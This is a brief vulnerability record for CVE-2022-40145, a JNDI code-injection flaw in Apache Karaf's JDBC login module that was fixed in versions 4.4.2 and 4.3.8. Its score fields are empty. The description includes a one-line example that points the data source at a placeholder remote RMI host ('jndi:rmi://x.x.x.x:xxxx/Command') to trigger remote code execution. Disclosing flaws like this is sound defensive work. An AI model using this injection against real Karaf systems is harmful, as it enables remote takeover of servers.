
# [CVE-2022-40145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40145)

## Description

- `This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasourceuse InitialContext.lookup(jndiName) without filtering.An user can modify `options.put(JDBCUtils.DATASOURCE, "osgi:" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,"jndi:rmi://x.x.x.x:xxxx/Command");` in JdbcLoginModuleTest#setup.This is vulnerable to a remote code execution (RCE) attack when aconfiguration uses a JNDI LDAP data source URI when an attacker hascontrol of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8`

## Cvss Data

- **Access Vector**:
  - 
- **Base Score**:
  - 

## Scores

- **Exploitability Score**:
  - 
- **Impact Score**:
  - 
- **Base Severity**:
  - 

## Other Information

- **Publish Date**:
  - 2022-12-21 16:15:08
- **Vulnerability Status**:
  - Modified

## References

- **security@apache.org**: https://karaf.apache.org/security/cve-2022-40145.txt
